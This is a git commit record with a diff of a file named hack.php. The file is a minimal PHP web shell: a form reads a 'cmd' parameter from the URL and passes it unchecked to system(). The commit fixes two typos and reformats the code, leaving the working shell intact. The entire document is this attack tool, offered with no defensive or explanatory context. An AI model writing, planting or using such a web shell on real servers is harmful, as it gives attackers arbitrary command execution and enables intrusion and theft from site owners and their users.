8b2db25496be69fc470d0b10aa09e2fb3ad3dbbc
HxDDD <89399749+HxDDD@users.noreply.github.com>
2024-05-24 14:23:37 +0900

    Update hack.php

--- hack.php
+++ hack.php
@@ -1,16 +1,16 @@
 <html>
-  <body>
-    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELE']); ?>">
-      <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
-      <input type="SUBMIT" value="Execite">
-    </form>
-  <pre>
-    <?php
-      if(isset($_GET['cmd']))
-      {
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
         system($_GET['cmd']);
-      }
-    ?>
-  </pre>
-  </body>
+    }
+?>
+</pre>
+</body>
 </html>
